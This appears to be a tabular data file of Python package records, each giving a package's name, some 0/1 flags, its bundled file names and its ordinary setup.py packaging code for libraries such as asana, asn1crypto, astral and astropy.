    version_regex = r""^__version__ = ['\""]([^'\""]*)['\""]""
    for line in lines:
        mo = re.search(version_regex, line, re.M)
        if mo:
            return mo.group(1)
    raise RuntimeError(""Unable to find version in %s."" % (VERSION_FILE,))


setup(
    name=""arviz"",
    license=""Apache-2.0"",
    version=get_version(),
    description=""Exploratory analysis of Bayesian models"",
    author=""ArviZ Developers"",
    url=""http://github.com/arviz-devs/arviz"",
    packages=find_packages(),
    install_requires=get_requirements(),
    extras_require=dict(all=get_requirements_optional()),  # test=get_requirements_dev(),
    long_description=get_long_description(),
    long_description_content_type=""text/markdown"",
    include_package_data=True,
    python_requires='>=3.7',
    classifiers=[
        ""Development Status :: 4 - Beta"",
        ""Framework :: Matplotlib"",
        ""Intended Audience :: Science/Research"",
        ""Intended Audience :: Education"",
        ""License :: OSI Approved :: Apache Software License"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Topic :: Scientific/Engineering"",
        ""Topic :: Scientific/Engineering :: Visualization"",
        ""Topic :: Scientific/Engineering :: Mathematics"",
    ],
)
",1
asana-1.0.0,0,1,1,0,0,0,0,0,client.py error.py page_iterator.py attachments.py audit_log_api.py batch_api.py custom_fields.py custom_field_settings.py events.py attachments.py audit_log_api.py batch_api.py custom_fields.py custom_field_settings.py events.py goals.py jobs.py organization_exports.py portfolios.py portfolio_memberships.py projects.py project_briefs.py project_memberships.py project_statuses.py project_templates.py sections.py status_updates.py stories.py tags.py tasks.py teams.py team_memberships.py time_periods.py typeahead.py users.py user_task_lists.py webhooks.py workspaces.py workspace_memberships.py __init__.py goals.py jobs.py organization_exports.py portfolios.py portfolio_memberships.py projects.py project_briefs.py project_memberships.py project_statuses.py project_templates.py sections.py status_updates.py stories.py tags.py tasks.py teams.py team_memberships.py time_periods.py typeahead.py users.py user_task_lists.py webhooks.py workspaces.py workspace_memberships.py __init__.py session.py version.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt zip-safe CHANGELOG CONTRIBUTORS LICENSE MANIFEST.in PKG-INFO README.md setup.cfg setup.py,"#!/usr/bin/env python

import sys
import os
from setuptools import setup, find_packages

assert sys.version_info >= (2, 7), 'We only support Python 2.7+'

sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'asana'))

# Safely read the version number from the version.py file
version = {}
with open('asana/version.py') as fp:
    exec(fp.read(), version)

with open(os.path.join(os.path.dirname(__file__), 'README.md')) as readme:
    long_description = readme.read()

setup(
    name='asana',
    version=version['__version__'],
    description='Asana API client',
    long_description=long_description,
    long_description_content_type='text/markdown',
    license='MIT',
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: MIT License',
        'Natural Language :: English',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6'
    ],
    install_requires=[
        'requests >= 2.20.0, == 2.*',
        'requests_oauthlib >= 0.8.0, <2.0',
        'six >= 1.10, == 1.*'
    ],
    author='Asana, Inc',
    # author_email='',
    url='http://github.com/asana/python-asana',
    packages=find_packages(exclude=('tests', 'examples')),
    keywords='asana',
    zip_safe=True,
    test_suite='tests')
",0
asciitable-0.8.0,0,1,1,1,0,0,1,0,basic.py cds.py core.py daophot.py fixedwidth.py ipac.py latex.py memory.py ui.py version.py __init__.py CHANGES fixed_width_gallery.rst index.rst PKG-INFO setup.py apostrophe.rdb apostrophe.tab bad.txt bars_at_ends.txt lmxbrefs.dat ReadMe lhs2065.dat ReadMe cds.dat cds2.dat commented_header.dat continuation.dat daophot.dat fill_values.txt ipac.dat latex1.tex latex2.tex nls1_stackinfo.dbout no_data_cds.dat no_data_daophot.dat no_data_ipac.dat no_data_without_header.dat no_data_with_header.dat short.rdb short.tab simple.txt simple2.txt simple3.txt simple4.txt simple5.txt space_delim_blank_lines.txt space_delim_no_header.dat space_delim_no_names.dat test4.dat test5.dat ReadMe table1.dat table5.dat vots_spec.dat whitespace.dat common.py test_cds_header_from_readme.py test_fixedwidth.py test_memory.py test_read.py test_types.py test_write.py __init__.py,"from distutils.core import setup
import os

long_description = """"""
Asciitable can read and write a wide range of ASCII table formats via built-in
Extension Reader Classes:

* **Basic**: basic table with customizable delimiters and header configurations
* **Cds**: `CDS format table <http://vizier.u-strasbg.fr/doc/catstd.htx>`_ (also Vizier and ApJ machine readable tables)
* **CommentedHeader**: column names given in a line that begins with the comment character
* **Daophot**: table from the IRAF DAOphot package
* **FixedWidth**: table with fixed-width columns
* **Ipac**: `IPAC format table <http://irsa.ipac.caltech.edu/applications/DDGEN/Doc/ipac_tbl.html>`_
* **Latex**: LaTeX tables (plain and AASTex)
* **Memory**: table already in memory (list of lists, dict of lists, etc)
* **NoHeader**: basic table with no header where columns are auto-named
* **Rdb**: tab-separated values with a column types line after the column names line
* **Tab**: tab-separated values

At the top level asciitable looks like many other ASCII table interfaces
since it provides default read() and write() functions with long lists of
parameters to accommodate the many variations possible in commonly encountered
ASCII table formats.  Below the hood however asciitable is built on a
modular and extensible class structure.  The basic functionality required for
reading or writing a table is largely broken into independent base class
elements so that new formats can be accomodated by modifying the underlying
class methods as needed.
""""""

from asciitable.version import version

setup(name='asciitable',
      version=version,
      description='Extensible ASCII table reader and writer',
      long_description=long_description,
      author='Tom Aldcroft',
      author_email='aldcroft@head.cfa.harvard.edu',
      url='http://cxc.harvard.edu/contrib/asciitable',
      license='BSD',
      platforms=['any'],
      classifiers=[
          'Development Status :: 5 - Production/Stable',
          'Intended Audience :: Science/Research',
          'License :: OSI Approved :: BSD License',
          'Topic :: Scientific/Engineering',
          'Topic :: Scientific/Engineering :: Astronomy',
          'Topic :: Scientific/Engineering :: Physics',
          'Programming Language :: Python :: 2',
          'Programming Language :: Python :: 3',
          ],
      packages=['asciitable'],
      )
",1
asciitree-0.3.3,0,1,1,1,0,0,0,0,drawing.py traversal.py util.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py,"#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os

from setuptools import setup, find_packages


def read(fname):
    return open(os.path.join(os.path.dirname(__file__), fname)).read()


setup(
    name='asciitree',
    version='0.3.3',
    description='Draws ASCII trees.',
    long_description=read('README.rst'),
    author='Marc Brinkmann',
    author_email='git@marcbrinkmann.de',
    url='http://github.com/mbr/asciitree',
    license='MIT',
    packages=find_packages(exclude=['tests']),
    install_requires=[],
)
",1
asgi-lifespan-1.0.1,0,1,1,1,1,0,0,0,py.typed _compat.py asyncio.py base.py trio.py __init__.py _exceptions.py _manager.py _types.py __init__.py __version__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGELOG.md LICENSE MANIFEST.in PKG-INFO README.md setup.cfg setup.py,"#!/usr/bin/env python
# -*- coding: utf-8 -*-

import re
import typing
from pathlib import Path

from setuptools import setup


def get_version(package: str) -> str:
    version = Path(package, ""__version__.py"").read_text()
    match = re.search(""__version__ = ['\""]([^'\""]+)['\""]"", version)
    assert match is not None
    return match.group(1)


def get_long_description() -> str:
    with open(""README.md"", encoding=""utf8"") as readme:
        with open(""CHANGELOG.md"", encoding=""utf8"") as changelog:
            return readme.read() + ""\n\n"" + changelog.read()


def get_packages(package: str) -> typing.List[str]:
    return [str(path.parent) for path in Path(package).glob(""**/__init__.py"")]


setup(
    name=""asgi-lifespan"",
    python_requires="">=3.6"",
    version=get_version(""asgi_lifespan""),
    url=""https://github.com/florimondmanca/asgi-lifespan"",
    license=""MIT"",
    description=""Programmatic startup/shutdown of ASGI apps."",
    long_description=get_long_description(),
    long_description_content_type=""text/markdown"",
    author=""Florimond Manca"",
    author_email=""florimond.manca@gmail.com"",
    packages=get_packages(""asgi_lifespan""),
    install_requires=[""sniffio"", ""async_exit_stack; python_version < '3.7'""],
    include_package_data=True,
    package_data={""asgi_lifespan"": [""py.typed""]},
    zip_safe=False,
    classifiers=[
        ""Development Status :: 5 - Production/Stable"",
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
    ],
)
",1
asgiref-3.5.2,0,1,1,1,1,0,0,0,compatibility.py current_thread_executor.py local.py py.typed server.py sync.py testing.py timeout.py typing.py wsgi.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py test_compatibility.py test_local.py test_server.py test_sync.py test_sync_contextvars.py test_testing.py test_wsgi.py,"from setuptools import setup  # type: ignore[import]

setup()
",1
asn1crypto-1.5.1,0,1,1,1,1,0,1,0,algos.py cms.py core.py crl.py csr.py keys.py ocsp.py parser.py pdf.py pem.py pkcs12.py tsp.py util.py version.py x509.py _errors.py _inet.py _int.py _iri.py _ordereddict.py _teletex_codec.py _types.py __init__.py dependency_links.txt LICENSE PKG-INFO SOURCES.txt top_level.txt changelog.md pem.md readme.md universal_types.md LICENSE PKG-INFO readme.md SECURITY.md setup.cfg setup.py,"import codecs
import os
import shutil
import sys
import warnings

import setuptools
from setuptools import setup, Command
from setuptools.command.egg_info import egg_info


PACKAGE_NAME = 'asn1crypto'
PACKAGE_VERSION = '1.5.1'
PACKAGE_ROOT = os.path.dirname(os.path.abspath(__file__))


# setuptools 38.6.0 and newer know about long_description_content_type, but
# distutils still complains about it, so silence the warning
sv = setuptools.__version__
svi = tuple(int(o) if o.isdigit() else o for o in sv.split('.'))
if svi >= (38, 6):
    warnings.filterwarnings(
        'ignore',
        ""Unknown distribution option: 'long_description_content_type'"",
        module='distutils.dist'
    )


# Try to load the tests first from the source repository layout. If that
# doesn't work, we assume this file is in the release package, and the tests
# are part of the package {PACKAGE_NAME}_tests.
if os.path.exists(os.path.join(PACKAGE_ROOT, 'tests')):
    tests_require = []
    test_suite = 'tests.make_suite'
else:
    tests_require = ['%s_tests' % PACKAGE_NAME]
    test_suite = '%s_tests.make_suite' % PACKAGE_NAME


# This allows us to send the LICENSE and docs when creating a sdist. Wheels
# automatically include the LICENSE, and don't need the docs. For these
# to be included, the command must be ""python setup.py sdist"".
package_data = {}
if sys.argv[1:] == ['sdist'] or sorted(sys.argv[1:]) == ['-q', 'sdist']:
    package_data[PACKAGE_NAME] = [
        '../LICENSE',
        '../*.md',
        '../docs/*.md',
    ]


# Ensures a copy of the LICENSE is included with the egg-info for
# install and bdist_egg commands
class EggInfoCommand(egg_info):
    def run(self):
        egg_info_path = os.path.join(
            PACKAGE_ROOT,
            '%s.egg-info' % PACKAGE_NAME
        )
        if not os.path.exists(egg_info_path):
            os.mkdir(egg_info_path)
        shutil.copy2(
            os.path.join(PACKAGE_ROOT, 'LICENSE'),
            os.path.join(egg_info_path, 'LICENSE')
        )
        egg_info.run(self)


class CleanCommand(Command):
    user_options = [
        ('all', 'a', '(Compatibility with original clean command)'),
    ]

    def initialize_options(self):
        self.all = False

    def finalize_options(self):
        pass

    def run(self):
        sub_folders = ['build', 'temp', '%s.egg-info' % PACKAGE_NAME]
        if self.all:
            sub_folders.append('dist')
        for sub_folder in sub_folders:
            full_path = os.path.join(PACKAGE_ROOT, sub_folder)
            if os.path.exists(full_path):
                shutil.rmtree(full_path)
        for root, dirs, files in os.walk(os.path.join(PACKAGE_ROOT, PACKAGE_NAME)):
            for filename in files:
                if filename[-4:] == '.pyc':
                    os.unlink(os.path.join(root, filename))
            for dirname in list(dirs):
                if dirname == '__pycache__':
                    shutil.rmtree(os.path.join(root, dirname))


readme = ''
with codecs.open(os.path.join(PACKAGE_ROOT, 'readme.md'), 'r', 'utf-8') as f:
    readme = f.read()


setup(
    name=PACKAGE_NAME,
    version=PACKAGE_VERSION,

    description=(
        'Fast ASN.1 parser and serializer with definitions for private keys, '
        'public keys, certificates, CRL, OCSP, CMS, PKCS#3, PKCS#7, PKCS#8, '
        'PKCS#12, PKCS#5, X.509 and TSP'
    ),
    long_description=readme,
    long_description_content_type='text/markdown',

    url='https://github.com/wbond/asn1crypto',

    author='wbond',
    author_email='will@wbond.net',

    license='MIT',

    classifiers=[
        'Development Status :: 5 - Production/Stable',

        'Intended Audience :: Developers',

        'License :: OSI Approved :: MIT License',

        'Programming Language :: Python',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.6',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.2',
        'Programming Language :: Python :: 3.3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
        'Programming Language :: Python :: Implementation :: CPython',
        'Programming Language :: Python :: Implementation :: PyPy',

        'Topic :: Security :: Cryptography',
    ],

    keywords='asn1 crypto pki x509 certificate rsa dsa ec dh',

    packages=[PACKAGE_NAME],
    package_data=package_data,

    tests_require=tests_require,
    test_suite=test_suite,

    cmdclass={
        'clean': CleanCommand,
        'egg_info': EggInfoCommand,
    }
)
",1
aspy.refactor_imports-3.0.2,0,1,1,1,0,0,0,0,classify.py import_obj.py sort.py __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE PKG-INFO README.md setup.cfg setup.py,"from __future__ import annotations

from setuptools import setup
setup()
",1
aspy.yaml-1.3.0,0,1,1,1,0,0,0,0,__init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE PKG-INFO README.md setup.cfg setup.py,"from setuptools import setup
setup()
",1
assertpy-1.1,0,1,1,1,1,0,0,0,assertpy.py base.py collection.py contains.py date.py dict.py dynamic.py exception.py extracting.py file.py helpers.py numeric.py snapshot.py string.py __init__.py LICENSE PKG-INFO setup.cfg setup.py,"from distutils.core import setup
import assertpy

desc = """"""
assertpy
========

Simple assertions library for unit testing in Python with a nice fluent API. Supports both Python 2 and 3.

Usage
-----

Just import the ``assert_that`` function, and away you go...::

    from assertpy import assert_that

    def test_something():
        assert_that(1 + 2).is_equal_to(3)
        assert_that('foobar').is_length(6).starts_with('foo').ends_with('bar')
        assert_that(['a', 'b', 'c']).contains('a').does_not_contain('x')

Of course, assertpy works best with a python test runner like `pytest <http://pytest.org/>`_ (our favorite) or `Nose <http://nose.readthedocs.org/>`_.

Install
-------

The assertpy library is available via `PyPI <https://pypi.org/project/assertpy/>`_.
Just install with::

    pip install assertpy

Or, if you are a big fan of `conda <https://conda.io/>`_ like we are, there is an
`assertpy-feedstock <https://github.com/conda-forge/assertpy-feedstock>`_ for
`Conda-Forge <https://conda-forge.org/>`_ that you can use::

    conda install assertpy --channel conda-forge

""""""

setup(
    name='assertpy',
    packages=['assertpy'],
    version=assertpy.__version__,
    description='Simple assertion library for unit testing in python with a fluent API',
    long_description=desc,
    author='Justin Shacklette',
    author_email='justin@saturnboy.com',
    url='https://github.com/assertpy/assertpy',
    download_url='https://github.com/assertpy/assertpy/archive/%s.tar.gz' % assertpy.__version__,
    keywords=['test', 'testing', 'assert', 'assertion', 'assertthat', 'assert_that', 'nose', 'nosetests', 'pytest', 'unittest'],
    license='BSD',
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: BSD License',
        'Natural Language :: English',
        'Operating System :: OS Independent',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Topic :: Software Development',
        'Topic :: Software Development :: Testing'])
",0
asset-0.6.13,0,1,1,1,0,0,0,0,isstr.py plugin.py resource.py symbol.py file1.nl file2.nl subfile1.nl data.csv test.py test_plugin.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt zip-safe CHANGELOG.rst LICENSE.txt MANIFEST.in PKG-INFO README.rst setup.cfg setup.py test-requirements.txt TODO.txt VERSION.txt,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
#------------------------------------------------------------------------------
# file: $Id$
# auth: metagriffin <mg.github@uberdev.org>
# date: 2013/10/29
# copy: (C) Copyright 2013-EOT metagriffin -- see LICENSE.txt
#------------------------------------------------------------------------------
# This software is free software: you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
# This software is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see http://www.gnu.org/licenses/.
#------------------------------------------------------------------------------

import os, sys, setuptools
from setuptools import setup, find_packages

# require python 2.7+
if sys.hexversion < 0x02070000:
  raise RuntimeError('This package requires python 2.7 or better')

heredir = os.path.abspath(os.path.dirname(__file__))
def read(*parts, **kw):
  try:    return open(os.path.join(heredir, *parts)).read()
  except: return kw.get('default', '')

test_dependencies = [
  'nose                 >= 1.3.0',
  'coverage             >= 3.5.3',
  # note: `pxml` should be installed as an egg, i.e.:
  #         easy_install --zip-ok pxml
  #       for the unit tests to be able to test that.
  'pxml                 >= 0.2.13',
]

dependencies = [
  # note: `globre` should be installed unzipped, i.e.:
  #         easy_install --always-unzip globre
  #       for the unit tests to be able to test that.
  'globre               >= 0.1.5',
  'six                  >= 1.10.0',
  'aadict               >= 0.2.2',
]

entrypoints = None

classifiers = [
  'Development Status :: 5 - Production/Stable',
  'Intended Audience :: Developers',
  'Programming Language :: Python',
  'Operating System :: OS Independent',
  'Natural Language :: English',
  'License :: OSI Approved :: GNU General Public License v3 or later (GPLv3+)',
]

setup(
  name                  = 'asset',
  version               = read('VERSION.txt', default='0.0.1').strip(),
  description           = 'A package resource and symbol loading helper library.',
  long_description      = read('README.rst'),
  classifiers           = classifiers,
  author                = 'metagriffin',
  author_email          = 'mg.pypi@uberdev.org',
  url                   = 'http://github.com/metagriffin/asset',
  keywords              = 'python package pkg_resources asset resolve lookup loader',
  packages              = find_packages(),
  platforms             = ['any'],
  include_package_data  = True,
  zip_safe              = True,
  install_requires      = dependencies,
  tests_require         = test_dependencies,
  test_suite            = 'asset',
  entry_points          = entrypoints,
  license               = 'GPLv3+',
)

#------------------------------------------------------------------------------
# end of $Id$
#------------------------------------------------------------------------------
",0
ast_decompiler-0.6.0,0,1,1,1,0,0,1,0,check.py decompiler.py py.typed __init__.py LICENSE PKG-INFO pyproject.toml README.rst tests.py test_basic.py test_indentation.py test_line_length.py test_literal.py test_patma.py test_precedence.py test_py3_syntax.py,,1
astatine-0.3.2,0,1,1,1,1,0,1,0,py.typed __init__.py LICENSE PKG-INFO pyproject.toml README.rst requirements.txt,,1
asteval-0.9.27,0,1,1,1,1,0,0,0,.codecov.yml .gitattributes codeql-analysis.yml macos_numpy.yml ubuntu_nonumpy.yml ubuntu_numpy.yml windows_numpy.yml .gitignore asteval.py astutils.py version.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt api.rst basics.rst conf.py index.rst installation.rst Makefile motivation.rst empty indexsidebar.html INSTALL LICENSE MANIFEST.in PKG-INFO pyproject.toml README.rst requirements.txt setup.cfg setup.py test_asteval.py,"#!/usr/bin/env python
from setuptools import setup
if __name__ == ""__main__"":
    setup()
",1
astor-0.8.1,0,1,1,1,1,0,0,0,codegen.py code_gen.py file_util.py node_util.py op_util.py rtrip.py source_repr.py string_repr.py tree_walk.py VERSION __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt zip-safe AUTHORS LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py setuputils.py build_expressions.py check_astunparse.py check_expressions.py support.py test_code_gen.py test_misc.py test_optional.py test_rtrip.py __init__.py,"from setuptools import setup

setup()
",1
astpretty-3.0.0,0,1,1,1,1,0,0,0,dependency_links.txt entry_points.txt PKG-INFO SOURCES.txt top_level.txt astpretty.py LICENSE PKG-INFO README.md setup.cfg setup.py,"from __future__ import annotations

from setuptools import setup
setup()
",1
astral-2.2,0,1,1,1,1,0,0,0,.buildinfo .nojekyll environment.pickle index.doctree package.doctree genindex.html index.html objects.inv package.html search.html searchindex.js elevation_horizon.svg elevation_sun.svg astral.rst.txt examples.rst.txt geocoder.rst.txt index.rst.txt location.rst.txt moon.rst.txt package.rst.txt sun.rst.txt astral.css basic.css bootstrap-scrollspy.js classic.css default.css doctools.js documentation_options.js earth_sun.png elevation_horizon.svg elevation_sun.svg favicon.png file.png home.png info_32.png jquery-3.4.1.js jquery.js language_data.js minus.png plus.png pygments.css searchtools.js sffjunkie.css sffjunkie.js sidebar.js stop_32.png underscore-1.3.1.js underscore.js warning_32.png weather-sunny.png LICENSE MANIFEST.in monkeypatch.py PKG-INFO pyproject.toml README.rst setup.cfg setup.py geocoder.py location.py moon.py sun.py __init__.py __main__.py .api_key almost_equal.py conftest.py test_all.py test_almost_equal.py test_buenos_aries.py test_depression_not_reached.py test_geocoder.py test_Location.py test_location_info.py test_misc.py test_Moon.py test_norway.py test_observer.py test_Repr.py test_sun_calc.py test_sun_elevation_adjustment.py test_sun_golden_blue.py test_sun_local.py test_sun_utc.py test_wellington.py,"# Copyright 2009-2019, Simon Kennedy, sffjunkie+code@gmail.com

import io
import os
from setuptools import setup

import monkeypatch  # noqa: F401


def read_contents(*names, **kwargs):
    return io.open(os.path.join(*names), encoding=kwargs.get(""encoding"", ""utf8"")).read()


description = ""Calculations for the position of the sun and moon.""
try:
    long_description = read_contents(os.path.dirname(__file__), ""README.rst"")
except:  # noqa
    long_description = description

setup(long_description=long_description)
",1
astroid-2.12.2,0,1,1,1,0,0,0,0,arguments.py astroid_manager.py bases.py brain_argparse.py brain_attrs.py brain_boto3.py brain_builtin_inference.py brain_collections.py brain_crypt.py brain_ctypes.py brain_curses.py brain_dataclasses.py brain_dateutil.py brain_fstrings.py brain_functools.py brain_gi.py brain_hashlib.py brain_http.py brain_hypothesis.py brain_io.py brain_mechanize.py brain_multiprocessing.py brain_namedtuple_enum.py brain_nose.py brain_numpy_core_einsumfunc.py brain_numpy_core_fromnumeric.py brain_numpy_core_function_base.py brain_numpy_core_multiarray.py brain_numpy_core_numeric.py brain_numpy_core_numerictypes.py brain_numpy_core_umath.py brain_numpy_ma.py brain_numpy_ndarray.py brain_numpy_random_mtrand.py brain_numpy_utils.py brain_pathlib.py brain_pkg_resources.py brain_pytest.py brain_qt.py brain_random.py brain_re.py brain_responses.py brain_scipy_signal.py brain_signal.py brain_six.py brain_sqlalchemy.py brain_ssl.py brain_subprocess.py brain_threading.py brain_type.py brain_typing.py brain_unittest.py brain_uuid.py helpers.py __init__.py builder.py const.py context.py decorators.py exceptions.py filter_statements.py helpers.py inference.py inference_tip.py dunder_lookup.py objectmodel.py spec.py util.py __init__.py __init__.py manager.py mixins.py modutils.py as_string.py const.py node_classes.py node_ng.py mixin.py scoped_nodes.py utils.py __init__.py utils.py _base_nodes.py __init__.py node_classes.py objects.py protocols.py raw_building.py rebuilder.py scoped_nodes.py test_utils.py transforms.py typing.py util.py _ast.py __init__.py __pkginfo__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt CONTRIBUTORS.txt LICENSE MANIFEST.in PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"# Keep file until dependabot issue is resolved
# https://github.com/dependabot/dependabot-core/issues/4483

from setuptools import setup

setup()
",1
astropy-5.1,0,1,1,1,0,0,0,0,.astropy-root config.yml .gitattributes bug_report.md feature_request.md labeler.yml PULL_REQUEST_TEMPLATE.md check_changelog.yml ci_cron_daily.yml ci_cron_weekly.yml ci_workflows.yml codeql-analysis.yml open_actions.yml stalebot.yml update_iers.yml .gitignore .mailmap .pep8speaks.yml .pre-commit-config.yaml hook-skyfield.py run_astropy_tests.py .readthedocs.yml CITATION affiliated.py configuration.py paths.py alias.cfg deprecated.cfg empty.cfg not_empty.cfg test_configs.py __init__.py __init__.py conftest.py astropyconst13.py astropyconst20.py astropyconst40.py cgs.py codata2010.py codata2014.py codata2018.py config.py constant.py iau2012.py iau2015.py si.py test_constant.py test_pickle.py test_prior_version.py test_sciencestate.py __init__.py utils.py __init__.py convolve.py core.py kernels.py setup_package.py convolve.c convolve.h test_convolve.py test_convolve_fft.py test_convolve_kernels.py test_convolve_models.py test_convolve_nddata.py test_convolve_speeds.py test_discretize.py test_kernel_class.py test_pickle.py __init__.py utils.py __init__.py angles.py angle_formats.py angle_lextab.py angle_parsetab.py angle_utilities.py attributes.py baseframe.py altaz.py baseradec.py cirs.py cirs_observed_transforms.py ecliptic.py ecliptic_transforms.py equatorial.py fk4.py fk4_fk5_transforms.py fk5.py galactic.py galactic_transforms.py galactocentric.py gcrs.py hadec.py hcrs.py icrs.py icrs_cirs_transforms.py icrs_fk5_transforms.py icrs_observed_transforms.py intermediate_rotation_transforms.py itrs.py lsr.py skyoffset.py supergalactic.py supergalactic_transforms.py utils.py __init__.py calculation.py constellation_data_roman87.dat constellation_names.dat sites.json distances.py earth.py earth_orientation.py erfa_astrom.py errors.py funcs.py jparser.py matching.py matrix_utilities.py name_resolve.py orbital_elements.py representation.py sites.py sky_coordinate.py sky_coordinate_parsers.py solar_system.py spectral_coordinate.py spectral_quantity.py fk4_no_e_fk4.csv fk4_no_e_fk5.csv galactic_fk4.csv icrs_fk5.csv rv.ecsv generate_ref_ast.py generate_spectralcoord_ref.py test_altaz_icrs.py test_ecliptic.py test_fk4_no_e_fk4.py test_fk4_no_e_fk5.py test_galactic_fk4.py test_icrs_fk5.py __init__.py helper.py test_angles.py test_angle_generators.py test_angular_separation.py test_api_ape5.py test_arrays.py test_atc_replacements.py test_celestial_transformations.py test_distance.py test_earth.py test_erfa_astrom.py test_finite_difference_velocities.py test_formatting.py test_frames.py test_frames_with_velocity.py test_funcs.py test_geodetic_representations.py test_iau_fullstack.py test_icrs_observed_transformations.py test_intermediate_transformations.py test_matching.py test_matrix_utilities.py test_name_resolve.py test_pickle.py test_regression.py test_representation.py test_representation_arithmetic.py test_representation_methods.py test_shape_manipulation.py test_sites.py test_skyoffset_transformations.py test_sky_coord.py test_sky_coord_velocities.py test_solar_system.py test_spectral_coordinate.py test_spectral_quantity.py test_transformations.py test_unit_representation.py test_utils.py test_velocity_corrs.py __init__.py transformations.py __init__.py connect.py core.py Planck13.ecsv Planck15.ecsv Planck18.ecsv WMAP1.ecsv WMAP3.ecsv WMAP5.ecsv WMAP7.ecsv WMAP9.ecsv base.py lambdacdm.py scalar_inv_efuncs.pyx conftest.py test_base.py test_init.py test_lambdacdm.py test_w0cdm.py test_w0wacdm.py test_w0wzcdm.py test_wpwazpcdm.py __init__.py w0cdm.py w0wacdm.py w0wzcdm.py wpwazpcdm.py __init__.py funcs.py cosmology.py ecsv.py mapping.py model.py row.py table.py base.py test_.py test_cosmology.py test_ecsv.py test_json.py test_mapping.py test_model.py test_row.py test_table.py test_yaml.py __init__.py utils.py yaml.py __init__.py parameter.py parameters.py realizations.py conftest.py helper.py test_connect.py test_core.py test_cosmology.py test_funcs.py test_parameter.py test_parameters.py test_realizations.py test_units.py test_utils.py __init__.py units.py utils.py __init__.py configobj.py validate.py __init__.py jquery.dataTables.css sort_asc.png sort_asc_disabled.png sort_both.png sort_desc.png sort_desc_disabled.png jquery-3.1.1.js jquery-3.1.1.min.js jquery.dataTables.js jquery.dataTables.min.js __init__.py cpp.py ctokens.py lex.py yacc.py ygen.py __init__.py README.rst _strptime.py __init__.py basic.py cds.py connect.py core.py cparser.pyx daophot.py docs.py ecsv.py fastbasic.py fixedwidth.py html.py ipac.py latex.py misc.py mrt.py qdp.py rst.py setup_package.py sextractor.py tokenizer.c tokenizer.h common.py apostrophe.rdb apostrophe.tab bad.txt bars_at_ends.txt ReadMe table.dat lmxbrefs.dat ReadMe lhs2065.dat lp944-20.dat ReadMe ReadMe ReadMe1 table.dat cds.dat cds2.dat cdsFunctional.dat cdsFunctional2.dat cds_malformed.dat commented_header.dat commented_header2.dat conf_py.txt continuation.dat daophot.dat daophot.dat.gz daophot2.dat daophot3.dat daophot4.dat fill_values.txt fixed_width_2_line.txt html.html html2.html ipac.dat ipac.dat.bz2 ipac.dat.xz latex1.tex latex1.tex.gz latex2.tex latex3.tex nls1_stackinfo.dbout no_data_cds.dat no_data_daophot.dat no_data_ipac.dat no_data_sextractor.dat no_data_without_header.dat no_data_with_header.dat sextractor.dat sextractor2.dat sextractor3.dat short.rdb short.rdb.bz2 short.rdb.gz short.rdb.xz short.tab simple.txt simple2.txt simple3.txt simple4.txt simple5.txt simple_csv.csv simple_csv_missing.csv space_delim_blank_lines.txt space_delim_no_header.dat space_delim_no_names.dat subtypes.ecsv test4.dat test5.dat ReadMe table1.dat table5.dat vots_spec.dat whitespace.dat test_cds.py test_cds_header_from_readme.py test_compressed.py test_connect.py test_c_reader.py test_ecsv.py test_fixedwidth.py test_html.py test_ipac_definitions.py test_qdp.py test_read.py test_rst.py test_types.py test_write.py __init__.py ui.py __init__.py card.py column.py connect.py convenience.py diff.py file.py fitsrec.py fitstime.py base.py compressed.py groups.py hdulist.py image.py nonstandard.py streaming.py table.py __init__.py header.py fitscheck.py fitsdiff.py fitsheader.py 